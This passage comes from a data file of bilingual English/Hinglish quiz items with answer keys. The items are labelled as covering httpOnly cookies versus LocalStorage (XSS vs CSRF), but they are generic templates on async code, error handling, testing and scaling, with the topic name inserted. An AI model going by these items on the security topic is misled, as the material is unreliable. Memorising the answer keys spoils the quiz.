      "hi": "Production hardening ke liye modular code, schema validation aur observability standard rules hote hain."
    }
  },
  {
    "question": {
      "en": "How does proper optimization of httpOnly Cookies vs LocalStorage (XSS vs CSRF) impact application memory and CPU consumption?",
      "hi": "httpOnly Cookies vs LocalStorage Security ko sahi dhang se optimize karne par application memory aur CPU par kya asar padta hai?"
    },
    "options": [
      {
        "en": "It increases server CPU temperature to 100 degrees Celsius",
        "hi": "Server CPU temperature 100 degrees kar deta hai"
      },
      {
        "en": "It minimizes redundant computations, eliminates memory leaks from uncleaned references, and maintains low latency under high concurrency",
        "hi": "Ye redundant computations ghatata hai, memory leaks khatam karta hai aur high concurrency mein low latency maintain karta hai"
      },
      {
        "en": "It doubles heap RAM allocation unconditionally",
        "hi": "Heap RAM ko zabardasti double karta hai"
      },
      {
        "en": "Optimization has zero measurable impact in modern web engines",
        "hi": "Modern web engines par optimization ka koi asar nahi hota"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "Preventing unnecessary allocations and cleaning up resources ensures low garbage collection pressure and predictable response times.",
      "hi": "Memory leak rokne aur unnecessary allocations hatane se Garbage Collector par load kam rehta hai aur response fast rehta hai."
    }
  },
  {
    "question": {
      "en": "What security principle is non-negotiable when handling data within httpOnly Cookies vs LocalStorage (XSS vs CSRF)?",
      "hi": "httpOnly Cookies vs LocalStorage Security mein data handle karte waqt kaunsa security principle non-negotiable hota hai?"
    },
    "options": [
      {
        "en": "Never trust client-supplied input: always sanitize, authenticate, authorize, and validate against strict schemas on the server",
        "hi": "Client data par blind trust na karein: server par hamesha sanitize, authenticate, authorize aur validate karein"
      },
      {
        "en": "Trust all requests coming from mobile devices or web browsers blindly",
        "hi": "Mobile ya browser se aane wali requests par blind trust karein"
      },
      {
        "en": "Disable HTTPS and SSL certificates to maximize raw network throughput",
        "hi": "Network throughput ke liye HTTPS band karein"
      },
      {
        "en": "Expose database admin credentials to all registered users",
        "hi": "Database admin credentials sabhi users ko expose karein"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Zero-Trust security dictates that every incoming request and data mutation must be validated and authenticated server-side before processing.",
      "hi": "Zero-Trust security ke mutabiq har incoming mutation ko server par strictly validate aur authenticate kiya jana chahiye."
    }
  },
  {
    "question": {
      "en": "How does asynchronous non-blocking execution operate in httpOnly Cookies vs LocalStorage (XSS vs CSRF)?",
      "hi": "httpOnly Cookies vs LocalStorage Security mein asynchronous non-blocking execution kaise kaam karta hai?"
    },
    "options": [
      {
        "en": "It freezes the entire operating system until each operation completes",
        "hi": "Har operation complete hone tak operating system freeze rehta hai"
      },
      {
        "en": "I/O operations return Promises or accept callbacks, delegating work to background threads/queues while the main thread remains free to handle incoming tasks",
        "hi": "I/O operations Promises return karte hain aur background queues use karke main thread ko baaki requests ke liye free rakhte hain"
      },
      {
        "en": "Async operations execute in reverse alphabetical order automatically",
        "hi": "Async operations reverse alphabetical order mein chalte hain"
      },
      {
        "en": "Async code only executes when triggered manually by a user click",
        "hi": "Sirf manual user click par async code chalta hai"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "Non-blocking asynchronous operations resolve via microtasks or event loop queues, ensuring the runtime thread serves concurrent requests smoothly.",
      "hi": "Non-blocking model main thread ko free rakhta hai taaki server bina rukaawat ke multiple users ko simultaneously serve kar sake."
    }
  },
  {
    "question": {
      "en": "What is the recommended pattern for propagating errors that occur in httpOnly Cookies vs LocalStorage (XSS vs CSRF)?",
      "hi": "httpOnly Cookies vs LocalStorage Security mein error aane par unhe propagate karne ka recommended pattern kya hai?"
    },
    "options": [
      {
        "en": "Intercepting the error, enriching it with operational context, and delegating to a centralized error handler or error boundary",
        "hi": "Error ko intercept karna, debug context add karna, aur centralized error handler ya error boundary ko pass karna"
      },
      {
        "en": "Swallowing errors silently with empty catch {} blocks to hide problems from logs",
        "hi": "Khaali catch {} blocks se errors ko silently daba dena taaki logs mein na dikhein"
      },
      {
        "en": "Shutting down the server machine power immediately",
        "hi": "Server machine power turant band kar dena"
      },
      {
        "en": "Sending internal raw stack traces and database credentials to end-user browsers",
        "hi": "Raw stack trace aur DB passwords browser par bhej dena"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Centralized error propagation provides complete operational observability while shielding internal infrastructure details from end users.",
      "hi": "Centralized error handling se system mein transparency rehti hai aur user ko clean, safe error messages milte hain."
    }
  },
  {
    "question": {
      "en": "When authoring unit or integration tests for httpOnly Cookies vs LocalStorage (XSS vs CSRF), what must the test suite assert?",
      "hi": "httpOnly Cookies vs LocalStorage Security ke liye automated tests likhte waqt test suite ko kya assert karna zaroori hai?"
    },
    "options": [
      {
        "en": "Only that the JavaScript file can be saved to disk",
        "hi": "Sirf ye ki file disk par save ho sake"
      },
      {
        "en": "Both the happy path (expected inputs producing valid outputs) AND boundary edge cases (null, empty arrays, network timeouts, invalid types)",
        "hi": "Happy path (valid data) AUR boundary edge cases (null, empty array, network timeout, invalid types) dono ko verify karna"
      },
      {
        "en": "That the test suite takes at least 24 hours to finish running",
        "hi": "Test suite ko 24 ghante chalna chahiye"
      },
      {
        "en": "Testing is considered unnecessary in modern full-stack development",
        "hi": "Modern development mein testing zaroori nahi hai"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "Robust automated test suites verify both standard valid scenarios and defensive failure modes to prevent regressions during deployments.",
      "hi": "Achhi testing valid inputs aur failure states dono ko assert karti hai taaki production deployments safe rahein."
    }
  },
  {
    "question": {
      "en": "How does modular design enhance code maintainability in httpOnly Cookies vs LocalStorage (XSS vs CSRF)?",
      "hi": "Modular design httpOnly Cookies vs LocalStorage Security mein code maintainability ko kaise badhata hai?"
    },
    "options": [
      {
        "en": "By isolating distinct responsibilities into small, reusable, and independently testable units following the Single Responsibility Principle",
        "hi": "Single Responsibility Principle ke zariye alag-alag kaamo ko chote, reusable aur testable units mein baant kar"
      },
      {
        "en": "By combining all frontend, backend, and database code into a single 50,000-line script",
        "hi": "Saara code ek hi 50,000-line script mein daal kar"
      },
      {
        "en": "By removing all function names and replacing them with random numbers",
        "hi": "Function names hata kar random numbers likhna"
      },
      {
        "en": "By forbidding code comments and documentation across the repository",
        "hi": "Comments aur documentation ban kar dena"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Modularity reduces cognitive load, simplifies debugging, prevents ripple effects during changes, and enables seamless team collaboration.",
      "hi": "Modular code se readability badhti hai, debugging aasan hoti hai aur ek jagah badlav karne par doosri jagah bugs nahi aate."
    }
  },
  {
    "question": {
      "en": "When application traffic scales 100x, how should httpOnly Cookies vs LocalStorage (XSS vs CSRF) be architected to support horizontal scaling?",
      "hi": "Traffic 100x badhne par httpOnly Cookies vs LocalStorage Security ko horizontally scale karne ke liye kya design approach honi chahiye?"
    },
    "options": [
      {
        "en": "Ensure the component/service is completely stateless, offload shared session/state to Redis/MongoDB, and distribute traffic via a load balancer",
        "hi": "Service ko completely stateless banayein, shared state ko Redis/DB par shift karein aur load balancer se traffic distribute karein"
      },
      {
        "en": "Store all user session variables in local in-memory JavaScript objects on the web server",
        "hi": "Server ki local RAM mein session variables store karna"
      },
      {
        "en": "Reboot the production server manually whenever memory usage exceeds 10%",
        "hi": "Memory 10% cross hote hi server manually reboot karna"
      },
      {
        "en": "Block 95% of incoming users using firewall rules",
        "hi": "95% users ko firewall se block kar dena"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Stateless service architecture guarantees that any container instance can handle any incoming request, enabling dynamic auto-scaling without session loss.",
      "hi": "Stateless architecture auto-scaling ka base hai jahan naye containers bina session loss ke instant traffic handle kar sakte hain."
    }
  },
  {
    "question": {
      "en": "In the full-stack MERN paradigm, where does httpOnly Cookies vs LocalStorage (XSS vs CSRF) properly belong and execute?",
      "hi": "Full-stack MERN architecture mein httpOnly Cookies vs LocalStorage Security kahan belong karta hai aur kahan execute hota hai?"
    },
    "options": [
      {
        "en": "In its designated architectural tier (Client browser UI, Express API backend, or MongoDB database) with clean API contracts connecting them",
        "hi": "Apne designated tier (Browser UI, Express API backend, ya MongoDB) mein clean API contracts ke saath"
      },
      {
        "en": "Directly on the end-user's local router firmware",
        "hi": "User ke local router firmware par"
      },
      {
        "en": "Inside the computer motherboard BIOS chip",
        "hi": "Motherboard BIOS chip mein"
      },
      {
        "en": "All MERN code runs strictly inside the MongoDB database engine",
        "hi": "Saara MERN code sirf MongoDB ke andar chalta hai"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Maintaining clear structural boundaries between client rendering, backend orchestration, and database persistence is the defining trait of MERN.",
      "hi": "Client UI, backend server aur database ke beech saaf boundary maintain karna MERN architecture ka mukhya niyam hai."
    }
  },
  {
    "question": {
      "en": "What telemetry metric or observability signal is most crucial for diagnosing issues with httpOnly Cookies vs LocalStorage (XSS vs CSRF) in production?",
      "hi": "Production mein httpOnly Cookies vs LocalStorage Security ki problems diagnose karne ke liye sabse zaroori telemetry metric kaunsi hoti hai?"
    },
    "options": [
      {
        "en": "The desktop monitor brightness setting of the client",
        "hi": "Client ke monitor ki brightness"
      },
      {
        "en": "Latency percentiles (p95/p99), error rates (HTTP 4xx/5xx), throughput (RPS), and heap memory allocation deltas",
        "hi": "Latency percentiles (p95/p99), error rates (4xx/5xx), throughput (RPS), aur heap memory allocation deltas"
      },
      {
        "en": "The number of files in the project's root folder",
        "hi": "Root folder mein files ki sankhya"
      },
      {
        "en": "The physical keyboard model used by the engineer",
        "hi": "Engineer ke keyboard ka model"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "Observability platforms monitor p95/p99 latencies, error frequencies, and memory utilization to identify bottlenecks and regressions early.",
      "hi": "p95/p99 latencies aur error rates monitor karne se crashes aane se pehle hi bottlenecks pakad mein aa jaate hain."
    }
  },
  {
    "question": {
      "en": "Why is eliminating unintended side effects essential when authoring logic for httpOnly Cookies vs LocalStorage (XSS vs CSRF)?",
      "hi": "httpOnly Cookies vs LocalStorage Security ka logic likhte waqt unintended side effects ko khatam karna kyun zaroori hai?"
    },
    "options": [
      {
        "en": "Side effects introduce unpredictability, corrupt shared state, cause race conditions, and make concurrent code nearly impossible to debug",
        "hi": "Side effects se code unpredictable banta hai, shared state corrupt hoti hai aur race conditions create hoti hain"
      },
      {
        "en": "Side effects permanently erase the developer's Git commit history",
        "hi": "Git history permanently delete ho jaati hai"
      },
      {
        "en": "Side effects are strictly required by the JavaScript ECMAScript standard",
        "hi": "ECMAScript mein side effects required hain"
      },
      {
        "en": "Side effects make all algorithms execute in O(1) time",
        "hi": "Saare algorithms O(1) time mein chalte hain"
      }
    ],
    "correctAnswer": 0,
    "explanation": {
      "en": "Pure and predictable logic produces the same output for identical inputs, guaranteeing thread safety, easy caching, and high reliability.",
      "hi": "Pure logic se shared state safe rehti hai aur same input par hamesha consistent aur predictable output milta hai."
    }
  },
  {
    "question": {
      "en": "How should client-side state be kept in sync with backend server mutations in httpOnly Cookies vs LocalStorage (XSS vs CSRF)?",
      "hi": "httpOnly Cookies vs LocalStorage Security mein client-side state aur backend server data ko sync mein kaise rakha jata hai?"
    },
    "options": [
      {
        "en": "By forcing a complete hard page refresh every 3 seconds",
        "hi": "Har 3 second mein poora page hard refresh karke"
      },
      {
        "en": "Using optimistic UI updates with error rollback, automated query cache invalidation (TanStack Query/RTK), or WebSocket change streams",
        "hi": "Optimistic UI updates with rollback, automated query cache invalidation ya WebSocket push streams use karke"
      },
      {
        "en": "By disabling all database update operations permanently",
        "hi": "Database updates ko permanently band karke"
      },
      {
        "en": "By saving user state in local CSV files on the server desktop",
        "hi": "Server desktop par CSV files save karke"
      }
    ],
    "correctAnswer": 1,
    "explanation": {
      "en": "Modern full-stack architectures synchronize state seamlessly using query cache invalidation, optimistic updates, and real-time socket events.",
      "hi": "Modern apps cache invalidation aur optimistic UI use karti hain taaki UI bina screen reload ke instantly updated rahe."
    }
  }
],
};
